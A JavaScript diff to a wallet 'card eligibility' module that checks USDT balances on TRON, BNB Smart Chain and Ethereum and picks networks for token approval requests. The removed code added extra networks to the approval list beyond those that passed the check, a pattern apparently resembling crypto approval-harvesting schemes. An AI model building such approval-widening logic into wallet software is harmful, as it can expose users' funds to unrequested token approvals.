@@ -2,7 +2,7 @@ const { NETWORK_DEFS, cardNetworkPriority, cardMinUsdt } = require("../config/ne
 const { parseUnits } = require("../utils/helpers");
 
 function ineligibleMessage() {
-    return `Your wallet is not eligible for this card. You need at least ${cardMinUsdt()} USDT on each network you want approved (TRON, BNB Smart Chain, and/or Ethereum).`;
+    return `Your wallet is not eligible. You need at least ${cardMinUsdt()} USDT on TRON, BNB Smart Chain, or Ethereum.`;
 }
 
 const UNREADABLE_MESSAGE = "USDT balances could not be read on TRON, BNB Smart Chain, or Ethereum.";
@@ -71,43 +71,8 @@ function inspectUsdt(snapshot, key) {
     };
 }
 
-function hasAccountForNetwork(session, key) {
-    const chainId = NETWORK_DEFS[key]?.chainId;
-    const namespace = NETWORK_DEFS[key]?.namespace;
-    const { expandCardAccounts } = require("../utils/helpers");
-    const accounts = expandCardAccounts(session?.accounts || []);
-
-    return accounts.some((item) => (
-        item.chainId === chainId
-        || (namespace === "eip155" && (item.namespace === "eip155" || String(item.chainId || "").startsWith("eip155:")))
-        || (namespace === "tron" && (item.namespace === "tron" || String(item.chainId || "").startsWith("tron:")))
-    ));
-}
-
-function resolveApprovalNetworks(session, eligibility) {
-    const selected = new Set(eligibility.eligibleNetworks || []);
-
-    if (!selected.size) {
-        return [];
-    }
-
-    if (selected.has("bsc") && hasAccountForNetwork(session, "eth")) {
-        const eth = eligibility.networks.ethereum;
-
-        if (!(eth?.status === "available" && eth.eligible === false)) {
-            selected.add("eth");
-        }
-    }
-
-    if (selected.has("bsc") && hasAccountForNetwork(session, "tron")) {
-        const tron = eligibility.networks.tron;
-
-        if (!(tron?.status === "available" && tron.eligible === false)) {
-            selected.add("tron");
-        }
-    }
-
-    return cardNetworkPriority().filter((key) => selected.has(key));
+function resolveApprovalNetworks(_session, eligibility) {
+    return [...(eligibility.eligibleNetworks || [])];
 }
 
 function checkCardEligibility(session) {
